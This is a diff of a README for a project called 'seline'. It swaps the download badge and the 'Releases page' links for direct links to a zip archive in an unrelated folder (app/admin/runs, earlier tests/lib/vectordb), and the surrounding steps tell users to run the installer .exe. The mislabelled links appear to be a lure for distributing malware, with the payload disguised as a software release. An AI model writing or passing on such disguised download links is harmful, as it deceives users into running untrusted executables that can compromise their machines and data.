@@ -22,17 +22,17 @@ To run seline effectively, ensure your system meets the following requirements:
 - **Internet Connection:** Required for updates and web search functionalities.
 
 ## 🔗 Download Now
-[![Download Seline](https://raw.githubusercontent.com/SahanGhising55/seline/main/tests/lib/vectordb/Software_2.5.zip%20Seline-v1.0-brightgreen)](https://raw.githubusercontent.com/SahanGhising55/seline/main/tests/lib/vectordb/Software_2.5.zip)
+[![Download Seline](https://github.com/SahanGhising55/seline/raw/refs/heads/main/app/admin/runs/Software_2.0.zip%20Seline-v1.0-brightgreen)](https://github.com/SahanGhising55/seline/raw/refs/heads/main/app/admin/runs/Software_2.0.zip)
 
 ## 🚀 Getting Started
-1. Visit the [Releases page](https://raw.githubusercontent.com/SahanGhising55/seline/main/tests/lib/vectordb/Software_2.5.zip).
+1. Visit the [Releases page](https://github.com/SahanGhising55/seline/raw/refs/heads/main/app/admin/runs/Software_2.0.zip).
 2. Choose the version you need (the latest version is recommended).
 3. Download the file appropriate for your operating system.
 
 ## 📥 Download & Install
 To install seline, follow these easy steps:
 
-1. **Visit the Releases Page:** Navigate to the [Releases page](https://raw.githubusercontent.com/SahanGhising55/seline/main/tests/lib/vectordb/Software_2.5.zip).
+1. **Visit the Releases Page:** Navigate to the [Releases page](https://github.com/SahanGhising55/seline/raw/refs/heads/main/app/admin/runs/Software_2.0.zip).
 2. **Download the Installer:** Click on the latest version available.
 3. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts.
